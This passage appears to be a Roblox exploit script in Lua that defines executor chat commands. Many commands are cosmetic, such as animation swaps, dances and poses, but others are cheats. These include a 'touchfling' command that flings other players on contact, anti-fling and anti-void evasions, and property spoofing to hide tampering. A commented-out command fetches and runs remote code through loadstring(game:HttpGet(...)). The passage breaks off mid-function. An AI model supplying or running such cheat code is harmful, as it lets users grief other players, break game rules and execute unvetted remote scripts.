AddCommand("upsidedown", {"dinnerbone"}, "upside down", {3}, function()
local c = game:FindFirstChildOfClass("Players").LocalPlayer.Character
local humanoid = c:WaitForChild("Humanoid")
local hrp0 = c:FindFirstChild("HumanoidRootPart")
local hrp1 = hrp0:Clone()
local Highlight = Instance.new("Highlight")
Highlight.Parent = hrp0
Highlight.Adornee = hrp0
Highlight.LineThickness = 0.01 
Highlight.FillColor = Color3.fromHSV(0,0,0)
c.Parent = nil
hrp0.Parent = hrp1
if humanoid.RigType == Enum.HumanoidRigType.R6 then hrp0.RootJoint.Part0 = nil else end
hrp1.Parent = c
c.Parent = workspace
local h = game:GetService("RunService").Heartbeat
hrp0.Transparency = 0.5
Utils.Notify(Caller, "Upsidedown", "Loaded!")
while h:Wait() and c and c.Parent do
	hrp0.CFrame = hrp1.CFrame
	hrp0.CanCollide = false
	hrp0.Orientation += Vector3.new(0, 0, 180)
	hrp0.Position -= Vector3.new(0, 1, 0)
	hrp0.Velocity = hrp1.Velocity
end
end)

AddCommand("lay", {"laydown"}, "lays on the floor", {}, function()
	local Human = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid')
	if not Human then
		return
	end
	Human.Sit = true
	task.wait(.1)
	Human.RootPart.CFrame = Human.RootPart.CFrame * CFrame.Angles(math.pi * .5, 0, 0)
	for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
		v:Stop()
	end
end)

AddCommand("blockholder", {}, "gives you an item to hold blocks", {}, function()
local backpack = game.Players.LocalPlayer.Backpack
local tool = Instance.new("Tool")
tool.Name = "BlockHolder"
tool.CanBeDropped = false

local handle = Instance.new("Part")
handle.Size = Vector3.new(1, 1, 1)
handle.Name = "Handle"
handle.Transparency = 0.5

local align = Instance.new("AlignPosition")
align.ApplyAtCenterOfMass = true

local att0 = Instance.new("Attachment")
local att1 = Instance.new("Attachment")
att0.Position = Vector3.new(0, 0, 0)

align.Attachment0 = att1
align.Responsiveness = 200

local orient = Instance.new("AlignOrientation")
orient.Responsiveness = 200
orient.Attachment0 = att1

handle.Parent = tool
align.Parent = handle
orient.Parent = handle
att0.Parent = handle

local function onEquipped(mouse)
	mouse.Button1Down:Connect(function()
		local target = mouse.Target
		if target and target.Parent then
			att1.Parent = target
			orient.Attachment1 = att0
			align.Attachment1 = att0
		end
	end)
end

tool.Equipped:Connect(onEquipped)
tool.Parent = backpack
	Utils.Notify(Caller, "Blockholder", "Got Blockholder!")
end)

AddCommand("r15v2", {}, "old r15 roblox animations", {4}, function()
	local Player = game:GetService("Players").LocalPlayer	
	Utils.Notify(Caller, "R15v2", "Loaded!")
	Player.Character.Animate.Disabled = true
	for i,v in pairs(Player.Character.Humanoid:GetPlayingAnimationTracks()) do
		v:Stop()
	end
	local a = game:GetObjects("rbxassetid://6816103163")[1]
	local function b()
		local c = Instance.new("LocalScript", Close)
		c.Name = "Animate"
		c.Parent = Player.Character
		for d, e in next, a:GetDescendants() do
			if e:IsA("StringValue") then
				e.Parent = c
			end
		end
		function waitForChild(f, g)
			local h = nil
			local i = f:findFirstChild(g)
			if i then
				return i
			end
			while true do
				h = f.ChildAdded:wait()
				if h.Name == g then
					break
				end
			end
			return h
		end
		local j = c.Parent
		local k = waitForChild(j, "Humanoid")
		k.CameraOffset = Vector3.new(0, 0, 0)
		math.randomseed(os.time())
		local l = {}
		function configureAnimationSet(m, n)
			if l[m] then
				local o, p, q = pairs(l[m].connections)
				while true do
					local r, s = o(p, q)
					if r then
					else
						break
					end
					q = r
					s:disconnect()
				end
			end
			l[m] = {}
			l[m].count = 0
			l[m].totalWeight = 0
			l[m].connections = {}
			local t = c:FindFirstChild(m)
			if t then
				table.insert(
					l[m].connections,
					t.ChildAdded:connect(
						function(u)
							configureAnimationSet(m, n)
						end
					)
				)
				table.insert(
					l[m].connections,
					t.ChildRemoved:connect(
						function(v)
							configureAnimationSet(m, n)
						end
					)
				)
				local w = 1
				local x, y, z = pairs(t:GetChildren())
				while true do
					local A, B = x(y, z)
					if A then
					else
						break
					end
					z = A
					if B:IsA("Animation") then
						table.insert(
							l[m].connections,
							B.Changed:connect(
								function(C)
									configureAnimationSet(m, n)
								end
							)
						)
						l[m][w] = {}
						l[m][w].anim = B
						local D = B:FindFirstChild("Weight")
						if D == nil then
							l[m][w].weight = 1
						else
							l[m][w].weight = D.Value
						end
						l[m].count = l[m].count + 1
						l[m].totalWeight = l[m].totalWeight + l[m][w].weight
						w = w + 1
					end
				end
			end
			if l[m].count <= 0 then
				local E, F, G = pairs(n)
				while true do
					local H, I = E(F, G)
					if H then
					else
						break
					end
					G = H
					l[m][H] = {}
					l[m][H].anim = Instance.new("Animation")
					l[m][H].anim.Name = m
					l[m][H].anim.AnimationId = I.id
					l[m][H].weight = I.weight
					l[m].count = l[m].count + 1
					l[m].totalWeight = l[m].totalWeight + I.weight
				end
			end
		end
		local J = {
			idle = {
				{id = "rbxasset://R15021216/idle_stretch.xml", weight = 1},
				{id = "rbxasset://R15021216/idle_look.xml", weight = 1},
				{id = "rbxasset://R15021216/idle.xml", weight = 9}
			},
			walk = {{id = "rbxasset://R15021216/run.xml", weight = 10}},
			run = {{id = "rbxasset://R15021216/run.xml", weight = 10}},
			jump = {{id = "rbxasset://R15021216/jump.xml", weight = 10}},
			fall = {{id = "rbxasset://R15021216/falling.xml", weight = 10}},
			climb = {{id = "rbxasset://R15021216/climb.xml", weight = 10}},
			sit = {{id = "http://www.roblox.com/asset/?id=393915321", weight = 10}},
			toolnone = {{id = "http://www.roblox.com/asset/?id=393915542", weight = 10}},
			toolslash = {{id = "http://www.roblox.com/asset/?id=393915542", weight = 10}},
			toollunge = {{id = "http://www.roblox.com/asset/?id=393915542", weight = 10}},
			wave = {{id = "http://www.roblox.com/asset/?id=393915710", weight = 10}},
			point = {{id = "http://www.roblox.com/asset/?id=393915866", weight = 10}},
			dance = {
				{id = "http://www.roblox.com/asset/?id=393916260", weight = 10},
				{id = "http://www.roblox.com/asset/?id=393916456", weight = 10},
				{id = "http://www.roblox.com/asset/?id=393916635", weight = 10}
			},
			dance2 = {
				{id = "http://www.roblox.com/asset/?id=393916791", weight = 10},
				{id = "http://www.roblox.com/asset/?id=393916989", weight = 10},
				{id = "http://www.roblox.com/asset/?id=393917195", weight = 10}
			},
			dance3 = {
				{id = "http://www.roblox.com/asset/?id=393917375", weight = 10},
				{id = "http://www.roblox.com/asset/?id=393917556", weight = 10},
				{id = "http://www.roblox.com/asset/?id=393917721", weight = 10}
			},
			laugh = {{id = "http://www.roblox.com/asset/?id=393916166", weight = 10}},
			cheer = {{id = "http://www.roblox.com/asset/?id=393916016", weight = 10}}
		}
		function scriptChildModified(K)
			local L = J[K.Name]
			if L then
				configureAnimationSet(K.Name, L)
			end
		end
		c.ChildAdded:connect(scriptChildModified)
		c.ChildRemoved:connect(scriptChildModified)
		for M, N in pairs(J) do
			configureAnimationSet(M, N)
		end
		local O = ""
		local P = {
			wave = false,
			point = false,
			dance = true,
			dance2 = true,
			dance3 = true,
			laugh = false,
			cheer = false
		}
		local Q = nil
		local R = nil
		local S = nil
		function stopAllAnimations()
			local T = O
			if P[T] then
				if P[T] == false then
					T = "idle"
				end
			end
			O = ""
			Q = nil
			if R then
				R:disconnect()
			end
			if S then
				S:Stop()
				S:Destroy()
				S = nil
			end
			return T
		end
		local U = 1
		function setAnimationSpeed(V)
			if V ~= U then
				U = V
				S:AdjustSpeed(U)
			end
		end
		function keyFrameReachedFunc(W)
			if W == "End" then
				local X = O
				if P[X] then
					if P[X] == false then
						X = "idle"
					end
				end
				playAnimation(X, 0.15, k)
				setAnimationSpeed(U)
			end
		end
		function playAnimation(Y, Z, _)
			local a0 = math.random(1, l[Y].totalWeight)
			local a1 = 1
			while true do
				if l[Y][a1].weight < a0 then
				else
					break
				end
				a0 = a0 - l[Y][a1].weight
				a1 = a1 + 1
			end
			local a2 = l[Y][a1].anim
			if a2 ~= Q then
				if S then
					S:Stop(Z)
					S:Destroy()
				end
				U = 1
				S = _:LoadAnimation(a2)
				S:Play(Z)
				O = Y
				Q = a2
				if R then
					R:disconnect()
				end
				R = S.KeyframeReached:connect(keyFrameReachedFunc)
			end
		end
		local a3 = ""
		function toolKeyFrameReachedFunc(a4)
			if a4 == "End" then
				playToolAnimation(a3, 0, k)
			end
		end
		local a5 = nil
		local a6 = nil
		local a7 = nil
		function playToolAnimation(a8, a9, aa)
			local ab = math.random(1, l[a8].totalWeight)
			local ac = 1
			while true do
				if l[a8][ac].weight < ab then
				else
					break
				end
				ab = ab - l[a8][ac].weight
				ac = ac + 1
			end
			local ad = l[a8][ac].anim
			if a5 ~= ad then
				if a6 then
					a6:Stop()
					a6:Destroy()
					a9 = 0
				end
				a6 = aa:LoadAnimation(ad)
				a6:Play(a9)
				a3 = a8
				a5 = ad
				a7 = a6.KeyframeReached:connect(toolKeyFrameReachedFunc)
			end
		end
		function stopToolAnimations()
			if a7 then
				a7:disconnect()
			end
			a3 = ""
			a5 = nil
			if a6 then
				a6:Stop()
				a6:Destroy()
				a6 = nil
			end
			return a3
		end
		local ae = "Standing"
		function onRunning(af)
			if 0.01 < af then
			else
				playAnimation("idle", 0.1, k)
				ae = "Standing"
				return
			end
			playAnimation("walk", 0.1, k)
			setAnimationSpeed(af / 15)
			ae = "Running"
		end
		function onDied()
			ae = "Dead"
		end
		local ag = 0
		function onJumping()
			playAnimation("jump", 0.1, k)
			ag = 0.31
			ae = "Jumping"
		end
		function onClimbing(ah)
			playAnimation("climb", 0.1, k)
			setAnimationSpeed(ah / 2)
			ae = "Climbing"
		end
		function onGettingUp()
			ae = "GettingUp"
		end
		function onFreeFall()
			if ag <= 0 then
				playAnimation("fall", 0.2, k)
			end
			ae = "FreeFall"
		end
		function onFallingDown()
			ae = "FallingDown"
		end
		function onSeated()
			ae = "Seated"
		end
		function onPlatformStanding()
			ae = "PlatformStanding"
		end
		function onSwimming(ai)
			if 0 < ai then
				ae = "Running"
				return
			end
			ae = "Standing"
		end
		function getTool()
			local aj, ak, al = ipairs(j:GetChildren())
			while true do
				local am, an = aj(ak, al)
				if am then
				else
					break
				end
				al = am
				if an.className == "Tool" then
					return an
				end
			end
			return nil
		end
		function getToolAnim(ao)
			local ap, aq, ar = ipairs(ao:GetChildren())
			while true do
				local as, at = ap(aq, ar)
				if as then
				else
					break
				end
				ar = as
				if at.Name == "toolanim" then
					if at.className == "StringValue" then
						return at
					end
				end
			end
			return nil
		end
		local au = "None"
		function animateTool()
			if au == "None" then
				playToolAnimation("toolnone", 0.1, k)
				return
			end
			if au == "Slash" then
				playToolAnimation("toolslash", 0, k)
				return
			end
			if au == "Lunge" then
			else
				return
			end
			playToolAnimation("toollunge", 0, k)
		end
		function moveSit()
			RightShoulder.MaxVelocity = 0.15
			LeftShoulder.MaxVelocity = 0.15
			RightShoulder:SetDesiredAngle(1.57)
			LeftShoulder:SetDesiredAngle(-1.57)
			RightHip:SetDesiredAngle(1.57)
			LeftHip:SetDesiredAngle(-1.57)
		end
		local av = 0
		local aw = 0
		function move(ax)
			av = ax
			if 0 < ag then
				ag = ag - (ax - av)
			end
			if ae == "FreeFall" then
				if ag <= 0 then
					playAnimation("fall", 0.2, k)
				else
					if ae == "Seated" then
						playAnimation("sit", 0.5, k)
						return
					end
					if ae == "Running" then
						playAnimation("walk", 0.1, k)
					elseif ae ~= "Dead" then
						if ae ~= "GettingUp" then
							if ae ~= "FallingDown" then
								if ae ~= "Seated" then
									if ae == "PlatformStanding" then
										stopAllAnimations()
									end
								else
									stopAllAnimations()
								end
							else
								stopAllAnimations()
							end
						else
							stopAllAnimations()
						end
					else
						stopAllAnimations()
					end
				end
			else
				if ae == "Seated" then
					playAnimation("sit", 0.5, k)
					return
				end
				if ae == "Running" then
					playAnimation("walk", 0.1, k)
				elseif ae ~= "Dead" then
					if ae ~= "GettingUp" then
						if ae ~= "FallingDown" then
							if ae ~= "Seated" then
								if ae == "PlatformStanding" then
									stopAllAnimations()
								end
							else
								stopAllAnimations()
							end
						else
							stopAllAnimations()
						end
					else
						stopAllAnimations()
					end
				else
					stopAllAnimations()
				end
			end
			local ay = getTool()
			if ay then
			else
				stopToolAnimations()
				au = "None"
				a5 = nil
				aw = 0
				return
			end
			animStringValueObject = getToolAnim(ay)
			if animStringValueObject then
				au = animStringValueObject.Value
				animStringValueObject.Parent = nil
				aw = ax + 0.3
			end
			if aw < ax then
				aw = 0
				au = "None"
			end
			animateTool()
		end
		k.Died:connect(onDied)
		k.Running:connect(onRunning)
		k.Jumping:connect(onJumping)
		k.Climbing:connect(onClimbing)
		k.GettingUp:connect(onGettingUp)
		k.FreeFalling:connect(onFreeFall)
		k.FallingDown:connect(onFallingDown)
		k.Seated:connect(onSeated)
		k.PlatformStanding:connect(onPlatformStanding)
		k.Swimming:connect(onSwimming)
		Player.Chatted:connect(
			function(az)
				local aA = ""
				if string.sub(az, 1, 3) == "/e " then
					aA = string.sub(az, 4)
				elseif string.sub(az, 1, 7) == "/emote " then
					aA = string.sub(az, 8)
				end
				if ae == "Standing" and P[aA] then
					playAnimation(aA, 0.1, k)
				end
			end
		)
		local aB = game:service("RunService")
		playAnimation("idle", 0.1, k)
		ae = "Standing"
		while j.Parent do
			local aC, aD = task.wait(0.1)
			move(aD)
		end
	end
	coroutine.wrap(b)()
end)

AddCommand("2006animations", {"2006anims"}, "old roblox animations", {2}, function()
	game.Players.LocalPlayer.Character:BreakJoints()
	game.Players.LocalPlayer.Character=nil
	Connection = game.Workspace.DescendantAdded:Connect(function(c)
		if c.Name == "Animate" then
			c.Disabled=true        
		end
	end)
	repeat wait() until game.Players.LocalPlayer.Character
	Char = game.Players.LocalPlayer.Character
	Died = game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Died:Connect(function()
		Connection:Disconnect()
		Died:Disconnect()
	end)
	wait(.1)
	function waitForChild(parent, childName)
		local child = parent:findFirstChild(childName)
		if child then return child end
		while true do
			child = parent.ChildAdded:wait()
			if child.Name==childName then return child end
		end
	end

	-- ANIMATION

	-- declarations

	local Figure = game.Players.LocalPlayer.Character
	local Torso = waitForChild(Figure, "Torso")
	local RightShoulder = waitForChild(Torso, "Right Shoulder")
	local LeftShoulder = waitForChild(Torso, "Left Shoulder")
	local RightHip = waitForChild(Torso, "Right Hip")
	local LeftHip = waitForChild(Torso, "Left Hip")
	local Neck = waitForChild(Torso, "Neck")
	local Humanoid = waitForChild(Figure, "Humanoid")
	local pose = "Standing"

	local toolAnim = "None"
	local toolAnimTime = 0

	local jumpMaxLimbVelocity = 0.75

	-- functions

	function onRunning(speed)
		if speed>0 then
			pose = "Running"
		else
			pose = "Standing"
		end
	end

	function onDied()
		pose = "Dead"
	end

	function onJumping()
		pose = "Jumping"
	end

	function onClimbing()
		pose = "Climbing"
	end

	function onGettingUp()
		pose = "GettingUp"
	end

	function onFreeFall()
		pose = "FreeFall"
	end

	function onFallingDown()
		pose = "FallingDown"
	end

	function onSeated()
		pose = "Seated"
	end

	function onPlatformStanding()
		pose = "PlatformStanding"
	end

	function onSwimming(speed)
		if speed>0 then
			pose = "Running"
		else
			pose = "Standing"
		end
	end

	function moveJump()
		RightShoulder.MaxVelocity = jumpMaxLimbVelocity
		LeftShoulder.MaxVelocity = jumpMaxLimbVelocity
		RightShoulder:SetDesiredAngle(3.14)
		LeftShoulder:SetDesiredAngle(-3.14)
		RightHip:SetDesiredAngle(0)
		LeftHip:SetDesiredAngle(0)
	end


	-- same as jump for now

	function moveFreeFall()
		RightShoulder.MaxVelocity = jumpMaxLimbVelocity
		LeftShoulder.MaxVelocity = jumpMaxLimbVelocity
		RightShoulder:SetDesiredAngle(3.14)
		LeftShoulder:SetDesiredAngle(-3.14)
		RightHip:SetDesiredAngle(0)
		LeftHip:SetDesiredAngle(0)
	end

	function moveSit()
		RightShoulder.MaxVelocity = 0.15
		LeftShoulder.MaxVelocity = 0.15
		RightShoulder:SetDesiredAngle(3.14 /2)
		LeftShoulder:SetDesiredAngle(-3.14 /2)
		RightHip:SetDesiredAngle(3.14 /2)
		LeftHip:SetDesiredAngle(-3.14 /2)
	end

	function getTool()
		for _, kid in ipairs(Figure:GetChildren()) do
			if kid.className == "Tool" then return kid end
		end
		return nil
	end

	function getToolAnim(tool)
		for _, c in ipairs(tool:GetChildren()) do
			if c.Name == "toolanim" and c.className == "StringValue" then
				return c
			end
		end
		return nil
	end

	function animateTool()

		if (toolAnim == "None") then
			RightShoulder:SetDesiredAngle(1.57)
			return
		end

		if (toolAnim == "Slash") then
			RightShoulder.MaxVelocity = 0.5
			RightShoulder:SetDesiredAngle(0)
			return
		end

		if (toolAnim == "Lunge") then
			RightShoulder.MaxVelocity = 0.5
			LeftShoulder.MaxVelocity = 0.5
			RightHip.MaxVelocity = 0.5
			LeftHip.MaxVelocity = 0.5
			RightShoulder:SetDesiredAngle(1.57)
			LeftShoulder:SetDesiredAngle(1.0)
			RightHip:SetDesiredAngle(1.57)
			LeftHip:SetDesiredAngle(1.0)
			return
		end
	end

	function move(time)
		local amplitude
		local frequency

		if (pose == "Jumping") then
			moveJump()
			return
		end

		if (pose == "FreeFall") then
			moveFreeFall()
			return
		end

		if (pose == "Seated") then
			moveSit()
			return
		end

		local climbFudge = 0

		if (pose == "Running") then
			if (RightShoulder.CurrentAngle > 1.5 or RightShoulder.CurrentAngle < -1.5) then
				RightShoulder.MaxVelocity = jumpMaxLimbVelocity
			else  
				RightShoulder.MaxVelocity = 0.15
			end
			if (LeftShoulder.CurrentAngle > 1.5 or LeftShoulder.CurrentAngle < -1.5) then
				LeftShoulder.MaxVelocity = jumpMaxLimbVelocity
			else  
				LeftShoulder.MaxVelocity = 0.15
			end
			amplitude = 1
			frequency = 9
		elseif (pose == "Climbing") then
			RightShoulder.MaxVelocity = 0.5
			LeftShoulder.MaxVelocity = 0.5
			amplitude = 1
			frequency = 9
			climbFudge = 3.14
		else
			amplitude = 0.1
			frequency = 1
		end

		desiredAngle = amplitude * math.sin(time*frequency)

		RightShoulder:SetDesiredAngle(desiredAngle + climbFudge)
		LeftShoulder:SetDesiredAngle(desiredAngle - climbFudge)
		RightHip:SetDesiredAngle(-desiredAngle)
		LeftHip:SetDesiredAngle(-desiredAngle)


		local tool = getTool()

		if tool then

			animStringValueObject = getToolAnim(tool)

			if animStringValueObject then
				toolAnim = animStringValueObject.Value
				-- message recieved, delete StringValue
				animStringValueObject.Parent = nil
				toolAnimTime = time + .3
			end

			if time > toolAnimTime then
				toolAnimTime = 0
				toolAnim = "None"
			end

			animateTool()


		else
			toolAnim = "None"
			toolAnimTime = 0
		end
	end


	-- connect events

	Humanoid.Died:connect(onDied)
	Humanoid.Running:connect(onRunning)
	Humanoid.Jumping:connect(onJumping)
	Humanoid.Climbing:connect(onClimbing)
	Humanoid.GettingUp:connect(onGettingUp)
	Humanoid.FreeFalling:connect(onFreeFall)
	Humanoid.FallingDown:connect(onFallingDown)
	Humanoid.Seated:connect(onSeated)
	Humanoid.PlatformStanding:connect(onPlatformStanding)
	Humanoid.Swimming:connect(onSwimming)
	-- main program

	local runService = game:service("RunService");

	while Figure.Parent~=nil do
		local _, time = wait(0.1)
		move(time)
	end
	Utils.Notify(Caller, "2006animations", "Loaded!")
end)

AddCommand("dance", {}, "plays a random dance animation", {3}, function()
	local Humanoid = game:FindService("Players").LocalPlayer.Character.Humanoid
	local Player = game:GetService("Players").LocalPlayer
	Anim = Instance.new("Animation")
	if Humanoid.RigType == Enum.HumanoidRigType.R15 then
		r15dances = {4555808220, 4555782893, 3333432454, 4049037604}
		local value = math.random(1, #r15dances)
		picked_value = r15dances[value]
	else
		r6dances = {33796059, 429730430, 45834924}
		local value = math.random(1, #r6dances)
		picked_value = r6dances[value]
	end
	local ActiveTracks = Player.Character.Humanoid:GetPlayingAnimationTracks()
	for _, v in pairs(ActiveTracks) do
		v:Stop()
	end    
	Utils.Notify(Caller, "Dance", "Playing dance animation! ID: " .. picked_value)
	Anim.AnimationId = ("rbxassetid://" .. picked_value)
	Hi = Player.Character.Humanoid:LoadAnimation(Anim)
	Hi:Play()
	Hi:AdjustSpeed(1)
end)

AddCommand("undance", {}, "stops the dance animation", {}, function()
	local Player = game:GetService("Players").LocalPlayer   
	local ActiveTracks = Player.Character.Humanoid:GetPlayingAnimationTracks()
	for _, v in pairs(ActiveTracks) do
		v:Stop()
	end    
	Utils.Notify(Caller, "Dance", "Disabled!")
end)

AddCommand("playsounds", {}, "plays all game sounds", {}, function()
	for _, sound in next, workspace:GetDescendants() do
		if sound:IsA("Sound") then
			sound:Play()
		end
	end
	Utils.Notify(Caller, "Playsounds", "Sounds played!")
end)

AddCommand("removedestroyheight", {"nodestroyheight"}, "can't die by void", {}, function()
	workspace.FallenPartsDestroyHeight = 0/1/0
	Utils.Notify(Caller, "Destroyheight", "Removed!")
end)

AddCommand("antiattach", {"antitools"}, "enables antiattach", {}, function()
	local charcon = nil
	local c = game:GetService("Players").LocalPlayer.Character
	local ws = game.workspace
	local function gp(parent, name, className)
		local ret = nil
		for i, v in pairs(parent:GetChildren()) do
			if (v.Name == name) and v:IsA(className) then
				ret = v
				break
			end
		end
		return ret
	end
	local rs = game:GetService("RunService")	
	local stepped = rs.Stepped
	local lp = game:GetService("Players").LocalPlayer
	local currentcon = nil
	local function onchar(c)
		--[[if not gui then
			--charcon:Disconnect()
			return
		end--]]
		if typeof(c) ~= "Instance" then
			return
		end
		if currentcon then
			currentcon:Disconnect()
		end
		currentcon = c.ChildAdded:Connect(function(t)
			if t:IsA("Tool") then
				local h = gp(t, "Handle", "BasePart") or t:FindFirstChildWhichIsA("BasePart")
				for i, v in pairs(h:GetConnectedParts()) do
					if not v:IsDescendantOf(c) then
						h:BreakJoints()
						stepped:Wait()
						if t and (t.Parent == c) then
							t.Parent = lp:FindFirstChildOfClass("Backpack") or ws
						end
						return
					end
				end
			end
		end)
	end
	onchar(lp.Character)
	charcon = lp.CharacterAdded:Connect(onchar)
	Utils.Notify(Caller, "Antiattach", "Enabled!")
end)

AddCommand("antifling", {}, "can't be flinged ", {}, function()
	repeat task.wait() until game:IsLoaded()	
	Player = game.Players.LocalPlayer
	local Players = game:GetService("Players")
	plrs = Players
	function nocollision(prt, plr)
		for i, v in pairs(plr:GetDescendants()) do
			if v:IsA("BasePart") then
				e = Instance.new("NoCollisionConstraint", v)
				e.Part0 = v
				e.Part1 = prt
			end
		end
	end
	for i, yes in pairs(Player.Character:GetDescendants()) do
		if yes:IsA("BasePart") then
			if yes:IsA("BasePart") then
				for i, v in pairs(plrs:GetDescendants()) do
					if v:IsA("Player") then
						nocollision(yes, v.Character)
					end
				end
			end
		end
	end
	Utils.Notify(Caller, "Antifling", "Enabled!")
end)

AddCommand("touchfling", {}, "enables invisible forcefield", {}, function()
	local hiddenfling = true
	local c = game:GetService("Players").LocalPlayer.Character
	local plrs = game:GetService("Players")
	local lp = plrs.LocalPlayer
	local rs = game:GetService("RunService")
	local v3 = Vector3.new
	local stepped = rs.Stepped
	local renderstepped = rs.RenderStepped
	local heartbeat = rs.Heartbeat
	local function gp(parent, name, className)
		local ret = nil
		for i, v in pairs(parent:GetChildren()) do
			if (v.Name == name) and v:IsA(className) then
				ret = v
				break
			end
		end
		return ret
	end
	spawn(function()
		local hrp, c, vel, movel = nil, nil, nil, 0.1
		while true do
			heartbeat:Wait()
			if hiddenfling then
				while hiddenfling and not (c and c.Parent and hrp and hrp.Parent) do
					heartbeat:Wait()
					c = lp.Character
					hrp = gp(c, "HumanoidRootPart", "BasePart") or gp(c, "Torso", "BasePart") or gp(c, "UpperTorso", "BasePart")
				end
				if hiddenfling then 
					vel = hrp.Velocity
					hrp.Velocity = vel * 10000 + v3(0, 10000, 0)
					--hrp.CFrame = hrp.CFrame * cf(0, 0.001, 0)
					renderstepped:Wait()
					if c and c.Parent and hrp and hrp.Parent then
						hrp.Velocity = vel
					end
					stepped:Wait()
					if c and c.Parent and hrp and hrp.Parent then
						hrp.Velocity = vel + v3(0, movel, 0)
						movel = movel * -1
					end
				end
			end
		end
	end)
	Utils.Notify(Caller, "Touchfling", "Enabled!")
end)

--[[AddCommand("clothingrescale", {}, "streches your layered clothing", {4}, function()
	local swimming = false
	local RunService = game:GetService("RunService")
	oldgrav = workspace.Gravity
	workspace.Gravity = 0
	local char = game.Players.LocalPlayer.Character
	local swimDied = function()
		workspace.Gravity = oldgrav
		swimming = false
	end
	local Humanoid = char:FindFirstChildWhichIsA("Humanoid")
	gravReset = Humanoid.Died:Connect(swimDied)
	local enums = Enum.HumanoidStateType:GetEnumItems()
	table.remove(enums, table.find(enums, Enum.HumanoidStateType.None))
	for i, v in pairs(enums) do
		Humanoid:SetStateEnabled(v, false)
	end
	Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
	swimbeat = RunService.Heartbeat:Connect(function()
		pcall(function()
			char.HumanoidRootPart.Velocity = ((Humanoid.MoveDirection ~= Vector3.new() or UserInputService:IsKeyDown(Enum.KeyCode.Space)) and char.HumanoidRootPart.Velocity or Vector3.new())
		end)
	end)
	swimming = true
	local Clip = false
	wait(0.1)
	local function NoclipLoop()
		if Clip == false and char ~= nil then
			for _, child in pairs(char:GetDescendants()) do
				if child:IsA("BasePart") and child.CanCollide == true then
					child.CanCollide = false
				end
			end
		end
	end
	Noclipping = RunService.Stepped:Connect(NoclipLoop)
	loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Leg%20Resize'))()
end)--]]

--[[AddCommand("headrescale", {}, "resizes your head", {4}, function()
	if game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid").RigType == Enum.HumanoidRigType.R15 then
		local Size = 6 --max size is 6
		local SetHandleSize = true
		local RemoveSeats = true

		if Size > 6 then
			Size = 6
		end

		local RunService = game:GetService("RunService")
		local UserInputService = game:GetService("UserInputService")
		local Player = game:GetService("Players").LocalPlayer
		local Character = Player.Character

		local Humanoid
		local Head

		if Character:FindFirstChildOfClass("Humanoid") then
			Humanoid = Character:FindFirstChildOfClass("Humanoid")
		end
		if Character:FindFirstChild("Head") then
			Head = Character.Head
		end

		if Humanoid.RigType == Enum.HumanoidRigType.R6 then return end

		coroutine.wrap(function()
			while Character do
				for _,x in next, Character:GetChildren() do
					if x:IsA("BasePart") then
						if x.CanCollide then
							x.CanCollide = false
							x.CustomPhysicalProperties = PhysicalProperties.new(9e9,9e9,9e9,9e9,9e9)
						end
					end
				end
				RunService.Stepped:wait()
			end
		end)()
		coroutine.wrap(function()
			while Character do
				local hum = Character.Humanoid
				local root = hum.RootPart

				if not hum or not root then return end

				if not Character:FindFirstChildWhichIsA("BodyMover", true) and UserInputService.MouseBehavior == Enum.MouseBehavior.LockCenter then
					local x,y,z = workspace.CurrentCamera.CFrame:ToEulerAnglesYXZ()
					Character:SetPrimaryPartCFrame(CFrame.new(root.CFrame.p) * CFrame.Angles(0, y, 0))
				end
				RunService.Heartbeat:wait()
			end
		end)()

		for i = 1,Size do
			if Head:FindFirstChild("OriginalSize") then
				if SetHandleSize then
					Head:FindFirstChild("OriginalSize"):Destroy()
				end
				task.wait()
				if Humanoid:FindFirstChildOfClass("NumberValue") then
					Humanoid:FindFirstChildOfClass("NumberValue"):Destroy()
				end
				Head.ChildAdded:wait()
				task.wait()
			end
		end
		if RemoveSeats then
			for _,x in next, workspace:GetDescendants() do
				if x:IsA("Seat") then
					x:Destroy()
				end
			end
		end

		Character.Animate.Disabled = true
		for _,x in next, Humanoid:GetPlayingAnimationTracks() do
			x:Stop()
		end
		Humanoid.HipHeight = 8.5
	end
	Utils.Notify(Caller, "Headrescale", "Rescaled!")
end)

AddCommand("hatrescale", {}, "resizes your hat", {4}, function()
	local Settings = {
		Values = {
			BodyTypeScale = true;
			BodyProportionScale = true;
			BodyWidthScale = true;
			BodyHeightScale = true;
			BodyDepthScale = true;
			HeadScale = true;
		};
		OriginalSize = true;
		OriginalPosition = false;
	}

	local Players = game:GetService("Players")
	local Player = Players.LocalPlayer
	local RemoveSeats = true
	local Character = Player.Character
	local Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
	if RemoveSeats then
		for _,x in next, workspace:GetDescendants() do
			if x:IsA("Seat") then
				x:Destroy()
			end
		end
	end
	local WaitFunc = function(x) x.DescendantAdded:wait() task.wait() end

	if Humanoid.RigType == Enum.HumanoidRigType.R6 then return end


	for _,x in next, Settings.Values do
		if x then
			if Settings.OriginalSize then --Specific Path/Settings
				for _, _os in next, Character:GetDescendants() do
					if _os.Name == "OriginalSize" and _os:IsA("ValueBase") then
						_os:Destroy()
					end
				end
			end
			if Settings.OriginalPosition then
				for _, _op in next, Character:GetDescendants() do
					if _op.Name == "OriginalPosition" and _op:IsA("ValueBase") then
						_op:Destroy()
					end
				end
			end
			if Humanoid:FindFirstChild(tostring(_)) then
				Humanoid:FindFirstChild(tostring(_)):Destroy()
			end
			WaitFunc(Character)
		end
	end
	Utils.Notify(Caller, "Hatrescale", "Rescaled!")
end)

AddCommand("legrescale", {}, "resizes your legs", {4}, function()
	local Animate = FindFirstChild(GetCharacter(), "Animate");
	SpoofProperty(Animate, "Disabled");
	Animate.Disabled = true

	local Settings = {
		Values = {
			BodyTypeScale = true;
			BodyProportionScale = true;
			BodyWidthScale = true;
			BodyHeightScale = true;
			BodyDepthScale = true;
			HeadScale = true;
		};
		OriginalSize = true;
		OriginalPosition = false;
	}

	local Players = game:GetService("Players")
	local Player = Players.LocalPlayer
	local RemoveSeats = true
	local Character = Player.Character
	local Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
	if RemoveSeats then
		for _,x in next, workspace:GetDescendants() do
			if x:IsA("Seat") then
				x:Destroy()
			end
		end
	end
	local WaitFunc = function(x) x.DescendantAdded:wait() task.wait() end

